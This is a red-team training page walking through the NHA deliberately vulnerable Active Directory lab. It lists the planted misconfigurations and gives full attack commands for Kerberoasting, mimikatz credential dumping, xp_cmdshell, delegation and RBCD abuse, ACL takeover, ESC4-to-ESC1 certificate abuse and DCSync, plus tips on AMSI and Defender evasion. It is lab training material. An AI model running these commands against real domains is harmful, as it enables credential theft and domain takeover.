---
layout: training-page
title: "Ninja Hacker Academy (NHA) — Red Team Academy"
module: "Active Directory"
tags:
  - nha
  - goad
  - lab
  - practice
  - active-directory
page_key: "ad-nha"
render_with_liquid: false
---

# Ninja Hacker Academy (NHA)

## About NHA

NHA (Ninja Hacker Academy) is an advanced deliberately-vulnerable Active Directory lab from Orange Cyberdefense — the same team behind GOAD. Where GOAD is a breadth-first introduction to AD attacks, NHA goes deeper: **Windows Defender is enabled on every machine**, passwords aren't in rockyou, and the attack chain is tightly interconnected with no easy shortcuts. The theme is Naruto-inspired; the misconfigurations are real.

**Goal:** Achieve Domain Admin on both `academy.ninja.lan` and `ninja.hack`.

**Starting point:** `srv01` (web.academy.ninja.lan) at `192.168.58.21` — no creds provided.

> NHA documentation explicitly discourages looking at recipe files for passwords. This page documents the vulnerability types and attack sequence — not the flags or plaintext credentials.

## Lab Architecture

```
# NHA Network Layout (192.168.58.0/24):
#
# Domain 1: ACADEMY.NINJA.LAN  (netbios: ACADEMY)
# ├── DC02  dc-ac.academy.ninja.lan       192.168.58.20  (WS2019, DC)
# ├── SRV01 web.academy.ninja.lan          192.168.58.21  (WS2019, IIS web server)  ← starting point
# ├── SRV02 sql.academy.ninja.lan          192.168.58.22  (WS2019, MSSQL)
# └── SRV03 share.academy.ninja.lan        192.168.58.23  (WS2019, file share, gMSA)
#
# Domain 2: NINJA.HACK  (netbios: NINJA)
# └── DC01  dc-vil.ninja.hack              192.168.58.10  (WS2019, DC + ADCS)
#
# Trust: ACADEMY.NINJA.LAN ←bidirectional→ NINJA.HACK
#
# Security posture: Windows Defender enabled on ALL machines, updates applied.
```

## Intentional Vulnerabilities

| Machine | Hostname | Vulnerability / Misconfiguration | Technique |
|---------|----------|----------------------------------|-----------|
| DC01 | dc-vil | ADCS — custom `SignatureValidation` template | [ADCS Attacks](/active-directory/adcs-attacks/) |
| DC01 | dc-vil | ACL: Jonin group has `GenericAll` on `SignatureValidation` cert template | [ACL Abuse](/active-directory/acl-abuse/) |
| DC01 | dc-vil | ACL: `Hokage` group has `GenericAll` on Domain Admins + AdminSDHolder | [ACL Abuse](/active-directory/acl-abuse/) |
| DC01 | dc-vil | ACL: `Sanin` group has `GenericAll` on `Jonin` group | [ACL Abuse](/active-directory/acl-abuse/) |
| DC01 | dc-vil | ACL: `olivia.davis` has `WriteDacl` on `rachel.philips` | [ACL Abuse](/active-directory/acl-abuse/) |
| DC02 | dc-ac | ACL: `SQL$` computer has `GenericAll` on `CN=Computers` OU | [ACL Abuse](/active-directory/acl-abuse/) |
| DC02 | dc-ac | ACL: `backup` user has `WriteOwner` on `Sensei` group + AdminSDHolder | [ACL Abuse](/active-directory/acl-abuse/) |
| DC02 | dc-ac | gMSA: `gmsaNFS$` has `ForceChangePassword` on `backup` user | [ACL Abuse](/active-directory/acl-abuse/) |
| SRV01 | web | IIS web application — web vulnerability for initial foothold | [Web Attacks](/web/) |
| SRV01 | web | CredSSP server enabled — accepts incoming CredSSP auth | [Kerberos Delegation](/active-directory/kerberos-delegation/) |
| SRV02 | sql | MSSQL with `xp_cmdshell` potential; `frank` is sysadmin | [Post-Exploitation](/post-exploitation/) |
| SRV02 | sql | Firewall disabled — direct access to all ports | — |
| SRV03 | share | Scheduled task: bot.ps1 connects to web via CredSSP as `frank` every 60s | Credential Capture |
| SRV03 | share | CredSSP client enabled — initiates CredSSP sessions to web | [Kerberos Delegation](/active-directory/kerberos-delegation/) |
| Any | — | `frank` has SPN `HTTP/WEB.academy.ninja.lan` — Kerberoastable | [Kerberoasting](/active-directory/kerberoasting/) |
| Any | — | `sql_svc` has SPN `MSSQLSvc/sql.academy.ninja.lan:1433` — Kerberoastable | [Kerberoasting](/active-directory/kerberoasting/) |
| Any | — | `frank` has constrained delegation (protocol transition) to `eventlog/share` | [Kerberos Delegation](/active-directory/kerberos-delegation/) |

## Users & Groups

### academy.ninja.lan (ACADEMY)

| Account | Type | Groups | Role / Notes |
|---------|------|--------|--------------|
| alice | User | Sensei, Domain Admins | Domain Admin |
| david | User | Sensei, Team7 | Team 7 sensei |
| frank | User | Teacher | SPN set (Kerberoastable); MSSQL sysadmin; constrained delegation |
| olivia | User | Teacher | Cross-domain counterpart to olivia.davis in ninja.hack |
| backup | User | — | Has WriteOwner on Sensei + AdminSDHolder |
| sql_svc | User | — | Service account; SPN set (Kerberoastable) |
| gmsaNFS$ | gMSA | — | Has ForceChangePassword on backup; authorized on `share` only |
| SQL$ | Computer | — | Has GenericAll on Computers OU |
| Sensei | Group | — | Local admins on web + sql; DA-equivalent |
| Teacher | Group | — | Local admins on web + sql |
| Genin | Group | — | Student accounts (Team 7–10) |

### ninja.hack (NINJA)

| Account | Type | Groups | Role / Notes |
|---------|------|--------|--------------|
| alice.johnson | User | Hokage, Domain Admins | Domain Admin |
| frank.umino | User | Academy_Teacher | Cross-domain counterpart |
| olivia.davis | User | Academy_Teacher | Has WriteDacl on rachel.philips |
| rachel.philips | User | Sanin | WriteDacl target; Sanin has GenericAll on Jonin |
| david.wilson | User | Jonin | Jonin has GenericAll on SignatureValidation template |
| Jonin | Group | — | GenericAll on `SignatureValidation` ADCS template |
| Sanin | Group | — | GenericAll on Jonin group |
| Hokage | Group | — | GenericAll on Domain Admins + AdminSDHolder |
| Academy_Teacher | Group | — | Cross-domain group |

## Flags

| Machine | Hostname | Flag Location |
|---------|----------|---------------|
| SRV01 | web | `C:\Users\Administrator\Desktop\flag.txt` |
| SRV02 | sql | `C:\flag.txt` (low priv) · `C:\Users\Administrator\Desktop\flag.txt` (admin) |
| SRV03 | share | `C:\Users\Administrator\Desktop\flag.txt` |
| DC02 | dc-ac | `C:\Users\Administrator\Desktop\flag.txt` (Domain Admin — ACADEMY) |
| DC01 | dc-vil | `C:\Users\Administrator\Desktop\flag.txt` (Domain Admin — NINJA) |

## Attack Chain

### Stage 1 — Web Foothold (SRV01)

The entry point is the IIS web application at `http://192.168.58.21`. Enumerate the web app for vulnerabilities — file upload, SQLi, SSRF, command injection, or authentication bypass. Get RCE and establish a C2 implant. Defender is live, so an evasive payload is required.

```
# Enumerate the web application:
curl http://192.168.58.21/
gobuster dir -u http://192.168.58.21 -w /usr/share/wordlists/dirb/common.txt -x php,aspx,html

# Once you have RCE — use an evasive loader (see Evasion section):
# Sliver, Havoc, or Cobalt Strike with Defender bypass

# After foothold on web, check for CredSSP connections arriving from share (srv03):
# srv03 runs bot.ps1 every 60 seconds: 
#   Invoke-Command -ComputerName web.academy.ninja.lan -Credential (academy\frank) -Authentication CredSSP
# Intercept with a rogue CredSSP listener or capture on-wire to extract frank's cleartext creds.
```

**Relevant pages:** [Web Attacks](/web/) · [Windows Defender Evasion](/evasion/windows-defender/) · [Shellcode Loaders](/evasion/shellcode-loaders/)

---

### Stage 2 — Domain Enumeration

```
# From web (SRV01) — BloodHound collection against ACADEMY:
bloodhound-python \
  -d 'academy.ninja.lan' \
  -u 'YOURACCOUNT' \
  -p 'PASSWORD' \
  -ns 192.168.58.20 \
  -c All \
  --zip

# Quick LDAP enum with NetExec:
netexec ldap 192.168.58.20 -u 'user' -p 'pass' -d 'academy.ninja.lan' \
  --kerberoasting kerb.txt --asreproast asrep.txt --users

# BloodHound queries to run:
# - Shortest path to Domain Admins
# - Find principals with DCSync rights
# - Find users with SPNs
# - Find computers where Domain Users are local admins
```

**Relevant pages:** [AD Enumeration](/active-directory/ad-enumeration/) · [BloodHound](/active-directory/bloodhound/)

---

### Stage 3 — Kerberoasting (frank, sql_svc)

Two Kerberoastable accounts in ACADEMY:

- `frank` — SPN: `HTTP/WEB.academy.ninja.lan` — Teacher account, MSSQL sysadmin
- `sql_svc` — SPN: `MSSQLSvc/sql.academy.ninja.lan:1433` — SQL service account

```
# Request TGS hashes:
GetUserSPNs.py 'academy.ninja.lan/anyuser:pass' \
  -dc-ip 192.168.58.20 -request

# Crack (passwords are NOT in rockyou — check custom wordlists, rules, or patterns):
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# Note: NHA passwords use patterns like "Il0ve!something" or "Sh@r1ng..." 
# Use rules-based cracking rather than straight wordlist attacks.
```

**Relevant page:** [Kerberoasting & AS-REP](/active-directory/kerberoasting/)

---

### Stage 4 — CredSSP Credential Capture (frank's creds)

srv03 runs a scheduled PowerShell bot (`bot.ps1`) every minute. The bot opens a CredSSP session to `web.academy.ninja.lan` authenticating as `academy\frank`. CredSSP delegates full cleartext credentials to the server — if you control `web`, you receive frank's cleartext password.

```
# After owning web (SRV01), monitor for incoming CredSSP sessions.
# Attackers typically capture via:
# 1. Rogue CredSSP server (e.g., intercept on port 5985/5986/3389)
# 2. Mimikatz sekurlsa::logonpasswords after bot connects
# 3. WDigest if enabled (not by default on WS2019)

# On the web server (after getting SYSTEM):
mimikatz # sekurlsa::logonpasswords
# Wait up to 60 seconds for the bot to connect — frank's cleartext creds will appear.
```

**Relevant pages:** [Kerberos Delegation](/active-directory/kerberos-delegation/) · [Post-Exploitation](/post-exploitation/)

---

### Stage 5 — MSSQL Abuse → RCE on SQL (frank → SRV02)

`frank` is a MSSQL sysadmin on `sql.academy.ninja.lan`. Use frank's credentials to access MSSQL and execute OS commands.

```
# Connect to MSSQL as frank:
mssqlclient.py 'academy.ninja.lan/frank:PASSWORD@192.168.58.22' -windows-auth

# Enable and use xp_cmdshell:
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
# Returns: academy\frank (or SYSTEM if service runs as SYSTEM)

# Or use NetExec:
netexec mssql 192.168.58.22 -u 'frank' -p 'PASSWORD' -d 'academy.ninja.lan' -x 'whoami'
```

**Relevant page:** [Post-Exploitation](/post-exploitation/)

---

### Stage 6 — Constrained Delegation (frank → S4U2Self/Proxy)

`frank` has constrained delegation **with protocol transition** (`TrustedToAuthForDelegation = true`) configured to delegate to `eventlog/share.academy.ninja.lan`. Protocol transition means frank can impersonate ANY user (including Domain Admins) to the eventlog service on `share` — no TGT from the target user needed.

```
# From Kali — S4U2Self + S4U2Proxy with Impacket:
getST.py \
  -spn 'eventlog/share.academy.ninja.lan' \
  -impersonate 'Administrator' \
  'academy.ninja.lan/frank:PASSWORD' \
  -dc-ip 192.168.58.20

# Use resulting ticket to access share as DA:
export KRB5CCNAME=Administrator@eventlog_share.academy.ninja.lan@ACADEMY.NINJA.LAN.ccache
wmiexec.py -k -no-pass Administrator@share.academy.ninja.lan

# Windows (Rubeus):
Rubeus.exe s4u /user:frank /password:PASSWORD /domain:academy.ninja.lan \
  /impersonateuser:Administrator \
  /msdsspn:"eventlog/share.academy.ninja.lan" \
  /ptt
```

**Relevant page:** [Kerberos Delegation Attacks](/active-directory/kerberos-delegation/)

---

### Stage 7 — gMSA Abuse → backup account (SRV03 → DC02)

The gMSA `gmsaNFS$` is authorized on `share` (SRV03) and has `ForceChangePassword` on the `backup` user. Read the gMSA password from `share`, then use it to reset `backup`'s password.

```
# From share (SRV03) — read gMSA password:
# Windows PowerShell:
$gmsa = Get-ADServiceAccount -Identity gmsaNFS -Properties msDS-ManagedPassword
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp

# Or via Impacket from Linux (with DA or machine account on share):
bloodyAD -u 'SQL$' -p ':NTLM_HASH' -d 'academy.ninja.lan' \
  --host 192.168.58.20 get object gmsaNFS$ --attr msDS-ManagedPassword

# With gmsaNFS$ hash — force reset backup user's password:
net rpc password backup 'NewP@ss123!' \
  -U 'academy.ninja.lan/gmsaNFS$%:GMSA_NTLM' \
  -S 192.168.58.20

# Or with rpcclient:
rpcclient -U 'academy.ninja.lan/gmsaNFS$%' 192.168.58.20
rpcclient $> setuserinfo2 backup 23 'NewP@ss123!'
```

**Relevant pages:** [ACL / ACE Abuse](/active-directory/acl-abuse/)

---

### Stage 8 — ACL Abuse: backup → Domain Admin (ACADEMY)

`backup` has `WriteOwner` on the `Sensei` group (which has local admin on web + sql and is effectively DA-adjacent) **and** on `AdminSDHolder`. Take ownership → grant yourself full control → add your account to Sensei.

`Sensei` members are also listed in `Domain Admins` via the alice account — escalating to Sensei membership gives Domain Admin.

```
# Take ownership of the Sensei group (from backup account):
bloodyAD -u backup -p 'NewP@ss123!' -d academy.ninja.lan --host 192.168.58.20 \
  set owner Sensei backup

# Grant backup GenericAll on Sensei:
bloodyAD -u backup -p 'NewP@ss123!' -d academy.ninja.lan --host 192.168.58.20 \
  add genericAll Sensei backup

# Add your account to Sensei:
bloodyAD -u backup -p 'NewP@ss123!' -d academy.ninja.lan --host 192.168.58.20 \
  add groupMember Sensei 'YOUR_USER'

# Or PowerView (Windows):
$cred = Get-Credential # backup credentials
Set-DomainObjectOwner -Identity Sensei -OwnerIdentity backup -Credential $cred
Add-DomainObjectAcl -TargetIdentity Sensei -PrincipalIdentity backup -Rights All -Credential $cred
Add-DomainGroupMember -Identity Sensei -Members 'youruser' -Credential $cred
```

**Relevant pages:** [ACL / ACE Abuse](/active-directory/acl-abuse/) · [AD Persistence](/active-directory/ad-persistence/)

---

### Stage 9 — SQL$ RBCD Abuse → lateral movement in ACADEMY

`SQL$` (the sql computer account) has `GenericAll` on `CN=Computers,DC=academy,DC=ninja,DC=lan`. This enables **Resource-Based Constrained Delegation (RBCD)** abuse: create a new computer account, configure RBCD on a target machine using SQL$'s GenericAll, then S4U2Self/Proxy to impersonate DA.

```
# Create attacker-controlled computer account:
addcomputer.py 'academy.ninja.lan/anyuser:pass' \
  -computer-name 'EVILPC$' \
  -computer-pass 'EvilPass123!' \
  -dc-ip 192.168.58.20

# Use SQL$ GenericAll on Computers to set msDS-AllowedToActOnBehalfOfOtherIdentity 
# on a target machine (e.g., share or dc02) pointing to EVILPC$:
rbcd.py -delegate-from 'EVILPC$' -delegate-to 'TARGET$' \
  -action write 'academy.ninja.lan/SQL$:NTLM_HASH' \
  -hashes :NTLM -dc-ip 192.168.58.20

# S4U2Self/Proxy — get DA ticket for target:
getST.py \
  -spn 'cifs/TARGET.academy.ninja.lan' \
  -impersonate 'Administrator' \
  'academy.ninja.lan/EVILPC$:EvilPass123!' \
  -dc-ip 192.168.58.20

export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass TARGET.academy.ninja.lan
```

**Relevant pages:** [Kerberos Delegation Attacks](/active-directory/kerberos-delegation/) · [ACL / ACE Abuse](/active-directory/acl-abuse/)

---

### Stage 10 — Cross-Domain Pivot to ninja.hack

`academy.ninja.lan` and `ninja.hack` share a **bidirectional trust**. After owning ACADEMY, use the inter-realm trust key to pivot into NINJA.

```
# From ACADEMY DA — dump trust keys:
secretsdump.py 'academy.ninja.lan/Administrator:pass@192.168.58.20'
# Look for: "ninja.hack\[TrustAccountName]" or inter-realm Kerberos keys

# Enumerate ninja.hack via trust:
bloodhound-python -d ninja.hack \
  -u 'Administrator@academy.ninja.lan' \
  -p 'PASSWORD' \
  -ns 192.168.58.10 \
  -c All

# Get cross-realm TGS for a service in ninja.hack:
getST.py \
  -spn 'cifs/dc-vil.ninja.hack' \
  -impersonate 'Administrator' \
  'academy.ninja.lan/Administrator:pass' \
  -dc-ip 192.168.58.20
```

**Relevant page:** [Domain Trusts](/active-directory/domain-trusts/)

---

### Stage 11 — ninja.hack ACL Chain → ADCS Abuse → Domain Admin

The attack path in `ninja.hack` uses a three-hop ACL chain terminating in ADCS template abuse (ESC4 → ESC1):

```
olivia.davis  →WriteDacl→  rachel.philips  (in Sanin)
Sanin group   →GenericAll→  Jonin group
Jonin group   →GenericAll→  SignatureValidation cert template
```

**Step 1 — olivia.davis WriteDacl on rachel.philips:**

```
# Add GenericAll ACE to rachel.philips via olivia.davis WriteDacl:
# (olivia.davis exists in both domains — use ninja.hack context after trust pivot)
dacledit.py -action write -rights FullControl \
  -principal 'olivia.davis' \
  -target 'rachel.philips' \
  'ninja.hack/olivia.davis:PASSWORD' \
  -dc-ip 192.168.58.10

# Now own rachel — reset her password or extract her hash:
net rpc password rachel.philips 'NewPass123!' \
  -U 'ninja.hack/olivia.davis%PASSWORD' -S 192.168.58.10
```

**Step 2 — Sanin → GenericAll → Jonin:**

```
# rachel.philips is in Sanin. Use Sanin's GenericAll on Jonin to add your account:
bloodyAD -u rachel.philips -p 'NewPass123!' -d ninja.hack --host 192.168.58.10 \
  add groupMember Jonin 'youruser'
```

**Step 3 — Jonin → GenericAll on SignatureValidation → ESC4 → ESC1:**

```
# Jonin has GenericAll on the SignatureValidation cert template.
# Modify template to make it ESC1-vulnerable (enrollee can supply SAN):
certipy template \
  -username 'youruser@ninja.hack' \
  -password 'pass' \
  -template 'SignatureValidation' \
  -save-old \
  -dc-ip 192.168.58.10
# Edit: set msPKI-Certificate-Name-Flag to ENROLLEE_SUPPLIES_SUBJECT

# Request cert as Domain Admin (ESC1):
certipy req \
  -username 'youruser@ninja.hack' \
  -password 'pass' \
  -ca 'ninja-DC-VIL-CA' \
  -template 'SignatureValidation' \
  -upn 'administrator@ninja.hack' \
  -dc-ip 192.168.58.10

# Authenticate with the cert (PKINIT):
certipy auth \
  -pfx administrator.pfx \
  -domain ninja.hack \
  -dc-ip 192.168.58.10
# → Gets NT hash for administrator@ninja.hack

# DCSync / shell:
secretsdump.py 'ninja.hack/administrator@192.168.58.10' -hashes :NT_HASH
```

**Relevant pages:** [ACL / ACE Abuse](/active-directory/acl-abuse/) · [ADCS Attacks](/active-directory/adcs-attacks/)

---

### Alternative Stage 11 — Hokage group → Direct DA on ninja.hack

If you can get a user into the `Hokage` group (e.g., by owning `alice.johnson` via trust pivot), `Hokage` has `GenericAll` on `Domain Admins` — trivially add any account.

```
# With Hokage group membership:
bloodyAD -u 'hokage_member' -p 'pass' -d ninja.hack --host 192.168.58.10 \
  add groupMember 'Domain Admins' 'youruser'
```

---

## Full Attack Path Summary

```
[EXTERNAL]
    │
    ▼
[1] Web exploit → RCE on web (SRV01 / 192.168.58.21)
    │
    ▼
[2] CredSSP bot captures frank's cleartext creds (srv03 → srv01 every 60s)
    │  ── OR ──
    Kerberoast frank (SPN: HTTP/WEB.academy.ninja.lan) → crack
    │
    ▼
[3] frank → MSSQL sysadmin on sql (SRV02) → xp_cmdshell → code exec
    │  ── AND ──
    frank → constrained delegation (S4U2Self) → impersonate DA on share (SRV03)
    │
    ▼
[4] SRV03 (share): read gmsaNFS$ password → ForceChangePassword on backup
    │
    ▼
[5] backup → WriteOwner on Sensei group → add to DA group → Domain Admin (ACADEMY)
    │  ── AND ──
    SQL$ → GenericAll on Computers OU → RBCD abuse → lateral movement in ACADEMY
    │
    ▼
[6] Trust pivot: academy.ninja.lan → ninja.hack
    │
    ▼
[7] olivia.davis WriteDacl → rachel.philips → Sanin → GenericAll → Jonin → GenericAll
    → SignatureValidation ADCS template → ESC4 → ESC1 → DA cert → Domain Admin (NINJA)
```

## Evasion Considerations

All machines run Windows Defender. Standard unobfuscated Meterpreter, Empire, or Covenant payloads will be detected immediately. Before attacking:

- Use an evasive C2 (Havoc, Sliver, Cobalt Strike) with custom loaders — see [Shellcode Loaders](/evasion/shellcode-loaders/)
- Patch AMSI in-process before running .NET tooling (Rubeus, SharpHound) — see [Windows Defender](/evasion/windows-defender/)
- Prefer LOLBAS and proxy execution where possible — see [LOTL Advanced](/evasion/lotl-advanced/)
- Run BloodHound collection from Linux (bloodhound-python) to avoid dropping SharpHound.exe

## Key Resources

- [GOAD repository (includes NHA provisioning)](https://github.com/Orange-Cyberdefense/GOAD)
- [NHA lab documentation](https://orange-cyberdefense.github.io/GOAD/labs/NHA/)
- [Lab author's blog with GOAD/NHA walkthroughs](https://mayfly277.github.io)
- [Certipy for ADCS attack enumeration and exploitation](https://github.com/ly4k/Certipy)
- [bloodyAD for ACL manipulation from Linux](https://github.com/CravateRouge/bloodyAD)
